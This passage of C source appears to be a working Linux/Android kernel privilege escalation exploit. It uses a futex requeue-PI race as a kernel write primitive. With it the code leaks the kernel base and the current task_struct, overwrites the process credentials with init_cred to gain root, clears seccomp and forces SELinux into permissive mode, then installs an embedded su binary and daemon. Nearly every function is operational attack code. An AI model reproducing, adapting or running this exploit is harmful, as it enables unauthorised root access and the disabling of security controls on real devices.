#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        int consumer_nice = PSELECT_CONSUMER_NICE;
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
}

static int read_selinux_enforcing(void) {
  char value = '?';
  int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t n = read(fd, &value, 1);
  close(fd);
  return n == 1 && value == '0' ? 0 : 1;
}

static int try_set_selinux_permissive(void) {
  errno = 0;
  int fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("SELinux userspace disable open failed errno=%d\n", errno);
    return 0;
  }
  errno = 0;
  ssize_t n = write(fd, "0", 1);
  int saved_errno = errno;
  close(fd);
  int ok = n == 1 && read_selinux_enforcing() == 0;
  pr_info("SELinux userspace disable write=%zd errno=%d ok=%d\n",
          n, saved_errno, ok);
  return ok;
}

static int ghostlock_set_selinux_permissive(const char *stage) {
  if (read_selinux_enforcing() == 0) {
    return 1;
  }

  for (int attempt = 1; attempt <= 5; attempt++) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (!page_base || !fake_task) {
      pr_warning("SELinux GhostLock %s setup failed attempt=%d/5\n",
                 stage, attempt);
      continue;
    }

    /* The exact BTF puts enforcing at byte 0 and initialized at byte 1.
     * A page-aligned direct-map pointer plus 0x100 therefore encodes a zero
     * enforcing byte and a guaranteed nonzero initialized byte. The remaining
     * bytes temporarily make the adjacent policy-capability booleans nonzero.
     * That bounded side effect is accepted only during the permissive interval
     * and disappears at the installation reboot. An eight-byte zero is worse:
     * it would make SELinux look uninitialized. */
    uintptr_t selinux_value = page_base + 0x100;
    pr_info("SELinux GhostLock %s attempt=%d/5 value=%016zx\n",
            stage, attempt, selinux_value);
    int triggered = ghostlock_write_pointer(data_addr(SELINUX_ENFORCING),
                                            selinux_value);
    int enforcing = read_selinux_enforcing();
    pr_info("SELinux GhostLock %s result triggered=%d enforcing=%d\n",
            stage, triggered, enforcing);
    if (enforcing == 0) {
      return 1;
    }
  }
  return 0;
}

static int read_seccomp_status(int *no_new_privs, int *seccomp) {
  char buf[4096];
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  char *nnp = strstr(buf, "NoNewPrivs:");
  char *sec = strstr(buf, "Seccomp:");
  if (!nnp || !sec) {
    return 0;
  }
  *no_new_privs = atoi(nnp + strlen("NoNewPrivs:"));
  *seccomp = atoi(sec + strlen("Seccomp:"));
  return 1;
}

static int direct_write_attempts(
    uintptr_t target, uintptr_t value, const char *label, int attempts) {
  for (int attempt = 1; attempt <= attempts; attempt++) {
    pr_info("direct write %s attempt=%d/%d target=%016zx value=%016zx\n",
            label, attempt, attempts, target, value);
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (!page_base || !fake_task) {
      pr_warning("direct write %s could not prepare a fresh fake task\n",
                 label);
      continue;
    }
    if (ghostlock_write_pointer(target, value)) {
      return 1;
    }
  }
  return 0;
}

static int identity_is_root(void) {
  uid_t uid = (uid_t)-1;
  uid_t euid = (uid_t)-1;
  uid_t suid = (uid_t)-1;
  gid_t gid = (gid_t)-1;
  gid_t egid = (gid_t)-1;
  gid_t sgid = (gid_t)-1;
  return getresuid(&uid, &euid, &suid) == 0 &&
         getresgid(&gid, &egid, &sgid) == 0 &&
         uid == 0 && euid == 0 && suid == 0 &&
         gid == 0 && egid == 0 && sgid == 0;
}

#define CRED_INSTALL_ATTEMPTS 6

static int install_current_init_cred(uintptr_t task, uintptr_t init_cred) {
  uid_t uid_before = (uid_t)-1;
  uid_t euid_before = (uid_t)-1;
  uid_t suid_before = (uid_t)-1;
  gid_t gid_before = (gid_t)-1;
  gid_t egid_before = (gid_t)-1;
  gid_t sgid_before = (gid_t)-1;
  if (getresuid(&uid_before, &euid_before, &suid_before) != 0 ||
      getresgid(&gid_before, &egid_before, &sgid_before) != 0) {
    pr_error("could not snapshot current real/effective/saved identities\n");
    return 0;
  }

  for (int attempt = 1; attempt <= CRED_INSTALL_ATTEMPTS; attempt++) {
    pr_info("current-cred left write attempt=%d/%d task=%016zx cred=%016zx\n",
            attempt, CRED_INSTALL_ATTEMPTS, task, init_cred);
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (!page_base || !fake_task) {
      continue;
    }
    int pointer_triggered = ghostlock_write_pointer_left(
        task + TASK_CRED_OFF, init_cred);

    /* The left-child side effect can land on either of the first two identity
     * qwords. If all real/effective/saved IDs already read back as zero, it
     * landed harmlessly and there is nothing to repair. Avoid six additional
     * GhostLock shots after root, where run15 showed that UFFD availability
     * changes the return-path timing. */
    if (identity_is_root()) {
      pr_success("current-cred pointer produced verified root without repair "
                 "triggered=%d\n", pointer_triggered);
      return 1;
    }

    /* rb_erase's left-child replacement writes the requested pointer to
     * task->cred, but __rb_change_child() first stores through either the
     * left or right link at init_cred+8/+16. Repair both adjacent identity
     * qwords unconditionally so a completed store cannot leave the global
     * init_cred damaged even when the child result pipe is lost. Right-child
     * writes of zero are leaf writes and have no secondary destination. */
    int repair_round = 0;
    for (;;) {
      int uidgid_triggered = direct_write_attempts(
          init_cred + CRED_UID_OFF, 0, "init-cred-uid-gid-repair", 3);
      int suidsgid_triggered = direct_write_attempts(
          init_cred + CRED_UID_OFF + 8, 0,
          "init-cred-suid-sgid-repair", 3);

      uid_t uid_now = (uid_t)-1;
      uid_t euid_now = (uid_t)-1;
      uid_t suid_now = (uid_t)-1;
      gid_t gid_now = (gid_t)-1;
      gid_t egid_now = (gid_t)-1;
      gid_t sgid_now = (gid_t)-1;
      int ids_ok = getresuid(&uid_now, &euid_now, &suid_now) == 0 &&
                   getresgid(&gid_now, &egid_now, &sgid_now) == 0;
      int root = ids_ok && uid_now == 0 && euid_now == 0 && suid_now == 0 &&
                 gid_now == 0 && egid_now == 0 && sgid_now == 0;
      int unchanged = ids_ok &&
                      uid_now == uid_before && euid_now == euid_before &&
                      suid_now == suid_before && gid_now == gid_before &&
                      egid_now == egid_before && sgid_now == sgid_before;
      pr_info("current-cred verify pointer=%d repair=%d/%d round=%d "
              "ids_ok=%d uid=%u/%u/%u gid=%u/%u/%u root=%d unchanged=%d\n",
              pointer_triggered, uidgid_triggered, suidsgid_triggered,
              ++repair_round, ids_ok, uid_now, euid_now, suid_now,
              gid_now, egid_now, sgid_now, root, unchanged);
      if (root) {
        return 1;
      }
      if (unchanged) {
        break;
      }

      /* A changed non-root identity proves task->cred now references the
       * temporarily damaged init_cred. Returning would poison a global
       * credential, so repair is mandatory before this process may exit. */
      pr_warning("init_cred identity fields remain dirty; mandatory repair "
                 "round=%d\n", repair_round);
    }
  }
  return identity_is_root();
}

#define BOOTID_RESTORE_ATTEMPTS 3

static int read_bootid_stable(uint64_t *lo, uint64_t *hi) {
  uint64_t lo1 = 0;
  uint64_t hi1 = 0;
  uint64_t lo2 = 0;
  uint64_t hi2 = 0;
  if (!slide_read_bootid_raw(&lo1, &hi1) ||
      !slide_read_bootid_raw(&lo2, &hi2) ||
      lo1 != lo2 || hi1 != hi2) {
    return 0;
  }
  if (lo) {
    *lo = lo1;
  }
  if (hi) {
    *hi = hi1;
  }
  return 1;
}

static int bootid_has_restore_fingerprint(uint64_t lo, uint64_t hi) {
  /* The right-child rb_erase shape performs both:
   *   random_table[4].data = sysctl_bootid
   *   *(u64 *)sysctl_bootid = random_table[4].data - 8
   * Therefore /proc/.../boot_id must expose target-8 in its low qword.
   * Its high qword is the untouched half of the boot UUID and, unlike the
   * live-mm owner window, must not be a direct-map task pointer. */
  return lo == (uint64_t)(SLIDE_RANDOM_BOOT_ID_DATA - 8) &&
         !is_direct_ptr((uintptr_t)hi);
}

static int restore_bootid_data(void) {
  uint64_t lo = 0;
  uint64_t hi = 0;
  if (read_bootid_stable(&lo, &hi) &&
      bootid_has_restore_fingerprint(lo, hi)) {
    pr_success("boot_id.data already restored fingerprint=%016llx:%016llx\n",
               (unsigned long long)hi, (unsigned long long)lo);
    return 1;
  }

  for (int attempt = 1; attempt <= BOOTID_RESTORE_ATTEMPTS; attempt++) {
    pr_info("boot_id.data restore attempt=%d/%d\n",
            attempt, BOOTID_RESTORE_ATTEMPTS);
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (!page_base || !fake_task) {
      continue;
    }
    int triggered = ghostlock_write_pointer(SLIDE_RANDOM_BOOT_ID_DATA,
                                            SLIDE_SYSCTL_BOOTID);

    /* Verify even if the result pipe was lost: the RB stores can complete
     * before the child report reaches userspace. */
    lo = 0;
    hi = 0;
    int stable = read_bootid_stable(&lo, &hi);
    if (stable && bootid_has_restore_fingerprint(lo, hi)) {
      pr_success("boot_id.data restored triggered=%d "
                 "fingerprint=%016llx:%016llx\n",
                 triggered, (unsigned long long)hi,
                 (unsigned long long)lo);
      return 1;
    }
    pr_warning("boot_id.data restore verification failed triggered=%d "
               "stable=%d raw=%016llx:%016llx\n",
               triggered, stable, (unsigned long long)hi,
               (unsigned long long)lo);
  }
  return 0;
}

static void restore_bootid_data_required(void) {
  int round = 0;
  while (!restore_bootid_data()) {
    /* The KASLR primitive temporarily redirects a global ctl_table entry.
     * The exact side-effect fingerprint prevents the false-negative loop from
     * run12; a genuine miss must still retry rather than leave that global
     * pointer on transient spray storage. */
    pr_warning("boot_id.data is still redirected; mandatory restore round=%d\n",
               ++round);
  }
}

#define PRINTK_VALUE_COUNT 4
#define LIVE_MM_REPAIR_ATTEMPTS 3

struct printk_values {
  int32_t value[PRINTK_VALUE_COUNT];
};

static struct printk_values saved_printk_values;
static int saved_printk_values_valid;
static uint64_t saved_printk_park_hi;

static uint64_t printk_qword(const struct printk_values *values,
                             int qword_index) {
  /* Each observable qword is two adjacent 32-bit proc_dointvec elements.
   * Callers use qword numbers (0 or 1), not raw array indices. */
  int value_index = qword_index * 2;
  return (uint64_t)(uint32_t)values->value[value_index] |
         ((uint64_t)(uint32_t)values->value[value_index + 1] << 32);
}

static int read_printk_values(struct printk_values *values) {
  char buf[256];
  errno = 0;
  int fd = open("/proc/sys/kernel/printk", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("printk reader open failed errno=%d\n", errno);
    return 0;
  }
  errno = 0;
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    pr_warning("printk reader read=%zd errno=%d\n", n, saved_errno);
    return 0;
  }
  buf[n] = 0;
  int parsed[PRINTK_VALUE_COUNT];
  int count = sscanf(buf, "%d %d %d %d", &parsed[0], &parsed[1],
                     &parsed[2], &parsed[3]);
  if (count != PRINTK_VALUE_COUNT) {
    pr_warning("printk reader parse=%d bytes=%zd raw='%.*s'\n",
               count, n, (int)n, buf);
    return 0;
  }
  for (int i = 0; i < PRINTK_VALUE_COUNT; i++) {
    values->value[i] = (int32_t)parsed[i];
  }
  return 1;
}

static int read_printk_values_stable(struct printk_values *values) {
  struct printk_values first;
  struct printk_values second;
  if (!read_printk_values(&first) || !read_printk_values(&second) ||
      memcmp(&first, &second, sizeof(first)) != 0) {
    return 0;
  }
  *values = first;
  return 1;
}

static int write_printk_values(const struct printk_values *values) {
  char buf[128];
  int len = snprintf(buf, sizeof(buf), "%d %d %d %d\n",
                     values->value[0], values->value[1],
                     values->value[2], values->value[3]);
  if (len <= 0 || len >= (int)sizeof(buf)) {
    return 0;
  }
  int fd = open("/proc/sys/kernel/printk", O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = write(fd, buf, (size_t)len);
  int saved_errno = errno;
  close(fd);
  errno = saved_errno;
  if (n != len) {
    return 0;
  }
  struct printk_values after;
  return read_printk_values_stable(&after) &&
         memcmp(&after, values, sizeof(after)) == 0;
}

static int snapshot_printk_values(void) {
  struct printk_values values;
  int readable = read_printk_values_stable(&values);
  uint64_t fingerprint = (uint64_t)(SLIDE_PRINTK_DATA - 8);
  if (!readable) {
    pr_warning("printk snapshot is not readable; refusing task leak\n");
    return 0;
  }
  if (printk_qword(&values, 0) == fingerprint) {
    /* A previous failed exploit process may have parked printk.data on
     * permanent boot-id storage or restored the pointer without yet fixing
     * console_printk[0..1]. The four Image defaults are the safe baseline. */
    saved_printk_values.value[0] = SLIDE_CONSOLE_PRINTK_DEFAULT_0;
    saved_printk_values.value[1] = SLIDE_CONSOLE_PRINTK_DEFAULT_1;
    saved_printk_values.value[2] = SLIDE_CONSOLE_PRINTK_DEFAULT_2;
    saved_printk_values.value[3] = SLIDE_CONSOLE_PRINTK_DEFAULT_3;
    pr_warning("printk snapshot using Image defaults raw=%016llx:%016llx\n",
               (unsigned long long)printk_qword(&values, 1),
               (unsigned long long)printk_qword(&values, 0));
  } else {
    saved_printk_values = values;
    pr_info("printk snapshot values=%d/%d/%d/%d\n",
            values.value[0], values.value[1],
            values.value[2], values.value[3]);
  }
  saved_printk_values_valid = 1;
  return 1;
}

static int repair_live_mm_ioctx(uintptr_t ioctx_slot,
                                uintptr_t expected_owner,
                                uintptr_t *observed_owner) {
  for (int attempt = 1; attempt <= LIVE_MM_REPAIR_ATTEMPTS; attempt++) {
    pr_info("live-mm ioctx repair attempt=%d/%d target=%016zx\n",
            attempt, LIVE_MM_REPAIR_ATTEMPTS, ioctx_slot);
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (!page_base || !fake_task) {
      continue;
    }
    int triggered = ghostlock_write_pointer(ioctx_slot, 0);

    /* printk's proc_dointvec handler has no UUID-style lazy write. While its
     * data pointer is on the mm window, { qword0=0, qword1=owner } therefore
     * proves both that ioctx_table is repaired and that owner stayed intact. */
    struct printk_values values;
    int stable = read_printk_values_stable(&values);
    uint64_t lo = stable ? printk_qword(&values, 0) : 0;
    uintptr_t owner = stable ? (uintptr_t)printk_qword(&values, 1) : 0;
    int verified = stable && lo == 0 && is_direct_ptr(owner) && !(owner & 7) &&
                   (!expected_owner || owner == expected_owner);
    if (verified) {
      if (observed_owner) {
        *observed_owner = owner;
      }
      pr_success("live-mm ioctx repaired triggered=%d owner=%016zx\n",
                 triggered, owner);
      return 1;
    }
    if (!expected_owner && triggered) {
      pr_success("live-mm ioctx repair triggered without readable owner\n");
      return 1;
    }
    pr_warning("live-mm ioctx repair not verified triggered=%d stable=%d "
               "raw=%016zx:%016llx\n",
               triggered, stable, owner, (unsigned long long)lo);
  }
  return 0;
}

static void park_printk_data_required(uint64_t bootid_hi) {
  int round = 0;
  for (;;) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (page_base && fake_task) {
      int triggered = ghostlock_write_pointer(SLIDE_PRINTK_DATA,
                                               SLIDE_SYSCTL_BOOTID);
      struct printk_values values;
      int stable = read_printk_values_stable(&values);
      uint64_t lo = stable ? printk_qword(&values, 0) : 0;
      uint64_t hi = stable ? printk_qword(&values, 1) : 0;
      if (stable && lo == (uint64_t)(SLIDE_PRINTK_DATA - 8) &&
          hi == bootid_hi) {
        pr_success("printk.data parked triggered=%d fingerprint=%016llx:%016llx\n",
                   triggered, (unsigned long long)hi,
                   (unsigned long long)lo);
        return;
      }
      pr_warning("printk.data park not verified triggered=%d stable=%d "
                 "raw=%016llx:%016llx\n",
                 triggered, stable, (unsigned long long)hi,
                 (unsigned long long)lo);
    }
    pr_warning("printk.data still references live mm; mandatory park round=%d\n",
               ++round);
  }
}

static int restore_printk_data_required(void) {
  if (!saved_printk_values_valid) {
    pr_error("printk restore called without saved values\n");
    return 0;
  }

  int round = 0;
  for (;;) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (page_base && fake_task) {
      int triggered = ghostlock_write_pointer(SLIDE_PRINTK_DATA,
                                               SLIDE_CONSOLE_PRINTK);
      struct printk_values values;
      int stable = read_printk_values_stable(&values);
      uint64_t lo = stable ? printk_qword(&values, 0) : 0;
      uint64_t hi = stable ? printk_qword(&values, 1) : 0;
      int pointer_restored = stable &&
          lo == (uint64_t)(SLIDE_PRINTK_DATA - 8) &&
          (triggered || hi != saved_printk_park_hi);
      pr_info("printk.data restore pointer=%d triggered=%d stable=%d "
              "raw=%016llx:%016llx\n",
              pointer_restored, triggered, stable,
              (unsigned long long)hi, (unsigned long long)lo);
      if (pointer_restored) {
        while (!write_printk_values(&saved_printk_values)) {
          pr_warning("console_printk values still dirty; mandatory userspace repair "
                     "errno=%d\n", errno);
        }
        pr_success("printk.data and console values restored=%d/%d/%d/%d\n",
                   saved_printk_values.value[0], saved_printk_values.value[1],
                   saved_printk_values.value[2], saved_printk_values.value[3]);
        return 1;
      }
    }
    pr_warning("printk.data restore mandatory round=%d\n", ++round);
  }
}

static uintptr_t leak_current_task_from_mm(void) {
  uintptr_t mm = leak_current_mm_struct();
  if (!is_direct_ptr(mm)) {
    return 0;
  }

  if (!snapshot_printk_values()) {
    return 0;
  }
  uint64_t bootid_lo = 0;
  uint64_t bootid_hi = 0;
  if (!read_bootid_stable(&bootid_lo, &bootid_hi) ||
      !bootid_has_restore_fingerprint(bootid_lo, bootid_hi)) {
    pr_error("task leak requires permanently restored boot_id storage\n");
    return 0;
  }
  saved_printk_park_hi = bootid_hi;

  for (int attempt = 1; attempt <= 4; attempt++) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (!page_base || !fake_task) {
      pr_warning("task leak page/mm setup failed attempt=%d page=%016zx mm=%016zx\n",
                 attempt, page_base, mm);
      continue;
    }

    /* proc_do_uuid mutates any source whose byte 8 is zero; a task_struct
     * pointer can legitimately end in 0x00, so boot_id is not a safe owner
     * reader. Redirect printk's four-int proc_dointvec entry instead. Its RB
     * side effect lands on the unused ioctx_table qword and the second qword
     * exposes mm->owner without any lazy write path. */
    uintptr_t owner_slot = mm + MM_OWNER_OFF;
    uintptr_t window = mm + MM_IOCTX_TABLE_OFF;
    if (window + sizeof(uintptr_t) != owner_slot) {
      pr_error("live-mm BTF layout is not adjacent ioctx=%016zx owner=%016zx\n",
               window, owner_slot);
      return 0;
    }
    int redirect_ok = ghostlock_write_pointer(SLIDE_PRINTK_DATA, window);

    struct printk_values values;
    int read_ok = read_printk_values_stable(&values);
    uint64_t lo = read_ok ? printk_qword(&values, 0) : 0;
    uintptr_t task = read_ok ? (uintptr_t)printk_qword(&values, 1) : 0;
    uint64_t side_effect = (uint64_t)(SLIDE_PRINTK_DATA - 8);
    int window_seen = read_ok && lo == side_effect &&
                      is_direct_ptr(task) && !(task & 7);

    int repair_needed = redirect_ok || window_seen || !read_ok;
    int repaired = !repair_needed;
    while (!repaired) {
      uintptr_t repaired_owner = 0;
      repaired = repair_live_mm_ioctx(window,
                                      window_seen ? task : 0,
                                      &repaired_owner);
      if (repaired_owner) {
        task = repaired_owner;
        window_seen = 1;
      }
      if (!repaired) {
        pr_warning("live-mm ioctx still dirty; retrying before process exit\n");
      }
    }

    /* Move the observable sysctl to permanent storage before validating,
     * retrying or exiting. Core printk state remains untouched while parked. */
    if (repair_needed) {
      park_printk_data_required(bootid_hi);
    } else {
      pr_info("printk.data redirect missed cleanly; no parking write needed\n");
    }

    if (!window_seen) {
      pr_warning("task leak invalid attempt=%d triggered=%d "
                 "raw=%016zx:%016llx owner=%016zx\n", attempt, redirect_ok,
                 task, (unsigned long long)lo, task);
      continue;
    }
    pr_success("task leak live_mm=%016zx owner=%016zx owner_slot=%016zx "
               "ioctx_repaired=%d reader=printk\n",
               mm, task, owner_slot, repaired);
    return task;
  }
  return 0;
}

static int clear_current_seccomp(uintptr_t task) {
  int nnp = -1;
  int seccomp = -1;
  int readable = read_seccomp_status(&nnp, &seccomp);
  pr_info("direct seccomp precheck readable=%d NoNewPrivs=%d Seccomp=%d\n",
          readable, nnp, seccomp);
  if (readable && nnp == 0 && seccomp == 0) {
    pr_success("direct seccomp already clear; no kernel writes required\n");
    return 1;
  }

  struct clear_step {
    uintptr_t target;
    const char *name;
  } steps[] = {
    {task + TASK_THREAD_INFO_FLAGS_OFF, "thread-info-flags"},
    {task + TASK_ATOMIC_FLAGS_OFF, "task-atomic-flags"},
    {task + TASK_SECCOMP_OFF, "seccomp-mode-count"},
    {task + TASK_SECCOMP_OFF + SECCOMP_FILTER_OFF, "seccomp-filter"},
  };
  for (size_t i = 0; i < sizeof(steps) / sizeof(steps[0]); i++) {
    if (!direct_write_attempts(steps[i].target, 0, steps[i].name, 3)) {
      return 0;
    }
  }
  nnp = -1;
  seccomp = -1;
  readable = read_seccomp_status(&nnp, &seccomp);
  pr_info("direct seccomp result readable=%d NoNewPrivs=%d Seccomp=%d\n",
          readable, nnp, seccomp);
  return readable && nnp == 0 && seccomp == 0;
}

static int install_direct_root_payload(void) {
  root_uid_after = getuid();
  int identity_root = root_uid_after == 0 && geteuid() == 0 &&
                      getgid() == 0 && getegid() == 0;

  /* Only task->cred is redirected. Calling setuid/setgid here would enter
   * commit_creds(), whose invariant requires cred == real_cred and can BUG on
   * this intentionally transient credential state. The installed init_cred
   * already supplies all four root identities; children created below receive
   * a normal matched credential pair through copy_creds(). */
  setgid_ret = identity_root ? 0 : -1;
  setuid_ret = identity_root ? 0 : -1;

  int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
  if (enforce_fd >= 0) {
    setenforce_ret = write(enforce_fd, "0", 1) == 1 ? 0 : -1;
    setenforce_errno = setenforce_ret == 0 ? 0 : errno;
    close(enforce_fd);
  } else {
    setenforce_ret = -1;
    setenforce_errno = errno;
  }

  pid_t daemon_pid = -1;
  int su_ok = install_embedded_su(&daemon_pid);
  int wallpaper_ok = install_embedded_wallpaper();
  root_child_done = identity_root && su_ok;
  pr_info("direct root result root=%d uid=%u gid=%u setuid=%d setgid=%d "
          "selinux=%d/%d su=%d daemon=%d wallpaper=%d complete=%d\n",
          identity_root, root_uid_after, getgid(), setuid_ret, setgid_ret,
          setenforce_ret, setenforce_errno, su_ok, daemon_pid, wallpaper_ok,
          root_child_done);
  return root_child_done;
}

/* Whole 6.12 chain, single attempt, in a pristine forked process. */
static int run_exploit_once(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 0;
  }

  /* The KASLR slide temporarily leaves boot_id.data on nfulnl_logger. Once
   * the text slide is known, restore permanent storage before starting the
   * independent live-mm leak so any later failure remains globally safe. */
  restore_bootid_data_required();

  root_uid_before = getuid();
  int selinux_state = read_selinux_enforcing();
  selinux_before = selinux_state < 0 ? 0xff : (uint8_t)selinux_state;

  /* Android labels /proc/sys/kernel/printk as generic proc rather than one
   * of shell's readable proc types. Disable enforcement before KernelSnitch's
   * non-mutating task reader; otherwise the physical target deterministically
   * stops after the live-mm leak with an inaccessible reader, as in run13. */
  if (selinux_state != 0 &&
      !ghostlock_set_selinux_permissive("pre-task-leak")) {
    pr_error("direct route could not make printk reader accessible\n");
    return 0;
  }

  pin_to_core(CORE);
  current_task_addr = leak_current_task_from_mm();
  if (!current_task_addr) {
    pr_error("direct route could not resolve current task_struct\n");
    return 0;
  }

  uintptr_t init_cred = data_addr(INIT_CRED);
  if (!install_current_init_cred(current_task_addr, init_cred)) {
    pr_error("direct route cred pointer write did not produce uid 0\n");
    return 0;
  }
  current_cred_addr = init_cred;

  if (!clear_current_seccomp(current_task_addr)) {
    pr_error("direct route obtained uid 0 but could not clear seccomp\n");
    return 0;
  }

  /* Reverify the early state. If a target reached this point while enforcing,
   * prefer SELinux's own exact-byte interface now that init_cred and seccomp
   * are fixed, retaining the constrained GhostLock encoding as a fallback. */
  int selinux_ok = read_selinux_enforcing() == 0 ||
                   try_set_selinux_permissive() ||
                   ghostlock_set_selinux_permissive("post-root-fallback");
  if (!selinux_ok) {
    pr_error("direct route failed to disable SELinux\n");
    return 0;
  }
  selinux_after = 0;

  /* The task leak parks printk.data on static boot-id storage so no failure
   * path can retain a pointer into this process mm. Once SELinux is permissive
   * we can restore both the ctl_table pointer and the exact four console
   * values, including the qword necessarily clobbered by the RB store. */
  if (!restore_printk_data_required()) {
    pr_error("direct route could not restore printk sysctl state\n");
    return 0;
  }

  atomic_store(&cfi_stage_done, 1);
  install_direct_root_payload();

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
